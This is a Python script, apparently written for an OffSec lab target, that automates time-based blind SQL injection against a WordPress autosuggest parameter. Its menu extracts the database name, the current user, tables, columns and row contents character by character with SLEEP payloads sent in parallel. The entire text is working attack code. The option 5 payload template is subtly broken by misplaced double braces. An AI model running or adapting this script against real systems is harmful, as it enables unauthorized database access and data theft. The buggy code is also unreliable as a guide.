import requests
import time
from urllib.parse import quote
from concurrent.futures import ThreadPoolExecutor, as_completed

delay_threshold = 4.0
sleep_time = 5
ascii_range = range(32, 127)

executor_threads = 5

def get_input_details():
    url = input("Target URL (e.g., http://192.168.1.1/zm/index.php): ").strip()
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Host": "workaholic.offsec",
        "Accept": "*/*",
        "Connection": "close"
    }
    return url, headers

def time_based_request(url, headers, payload_raw):
    payload_full = f"{payload_raw}-- wXyW"
    encoded_payload = quote(payload_full, safe="()")
    data = f"t=wp_autosuggest&f={encoded_payload}&l=5&type=0&e=utf-8&q=c&limit=5&timestamp=19692269759899"
    full_url = f"{url}?{data}"

    start = time.time()
    requests.get(full_url, headers=headers)
    elapsed = time.time() - start
    return elapsed

def extract_value(url, headers, payload_template, label, **kwargs):
    result = ""
    pos = 1
    while True:
        found = False

        def make_task(ascii_code):
            payload = payload_template.format(pos=pos, ascii=ascii_code, sleep=sleep_time, **kwargs)
            elapsed = time_based_request(url, headers, payload)
            return ascii_code, elapsed

        with ThreadPoolExecutor(max_workers=executor_threads) as executor:
            futures = {executor.submit(make_task, code): code for code in ascii_range}
            for future in as_completed(futures):
                ascii_code, elapsed = future.result()
                print(f"Testing {label} pos={pos}, ascii={ascii_code} ({chr(ascii_code)}), time={elapsed:.2f}s")
                if elapsed > delay_threshold:
                    result += chr(ascii_code)
                    print(f"[+] {label} char {pos}: '{chr(ascii_code)}' → {result}")
                    found = True
                    break

        if not found:
            break
        pos += 1
    return result

def extract_list(url, headers, payload_template, label, **kwargs):
    index = 0
    results = []
    while True:
        item = extract_value(
            url, headers, payload_template,
            label=f"{label} {index}", index=index, **kwargs
        )
        if item:
            results.append(item)
            index += 1
        else:
            break
    return results

def to_hex_string(s):
    return '0x' + s.encode().hex()

def main():
    url, headers = get_input_details()

    while True:
        print("""
[ Payload Options ]
1. Extract database name
2. Extract current database user
3. Extract table names
4. Extract column names from a table
5. Extract row values from a table and column
0. Exit
""")
        choice = input("Select an option: ").strip()

        if choice == '1':
            payload = "IF(ASCII(SUBSTRING(DATABASE(),{pos},1))={ascii}, SLEEP({sleep}), 0)"
            db = extract_value(url, headers, payload, "Database")
            print(f"[✓] Database name: {db}")

        elif choice == '2':
            payload = "IF(ASCII(SUBSTRING(USER(),{pos},1))={ascii}, SLEEP({sleep}), 0)"
            user = extract_value(url, headers, payload, "User")
            print(f"[✓] Current DB user: {user}")

        elif choice == '3':
            payload = ("IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables "
                       "WHERE table_schema=DATABASE() LIMIT {index},1),{pos},1))={ascii}, SLEEP({sleep}), 0)")
            tables = extract_list(url, headers, payload, "Table")
            print(f"[✓] Table names: {tables}")

        elif choice == '4':
            table = input("Enter table name: ").strip()
            table_hex = to_hex_string(table)
            payload = ("IF(ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns "
                       f"WHERE table_name={table_hex} AND table_schema=DATABASE() "
                       "ORDER BY ordinal_position LIMIT {{index}},1),{{pos}},1))={{ascii}}, SLEEP({{sleep}}), 0)")
            columns = extract_list(url, headers, payload, "Column")
            print(f"[✓] Columns in {table}: {columns}")

        elif choice == '5':
            table = input("Enter table name: ").strip()
            column = input("Enter column name: ").strip()
            payload = ("IF(ASCII(SUBSTRING((SELECT {column} FROM {table} "
                       "ORDER BY id LIMIT {{index}},1),{{pos}},1))={{ascii}}, SLEEP({sleep}), 0)")
            values = extract_list(url, headers, payload, "Row", table=table, column=column)
            print(f"[✓] Values from {table}.{column}: {values}")

        elif choice == '0':
            break

        else:
            print("[-] Invalid choice. Try again.")

if __name__ == "__main__":
    main()
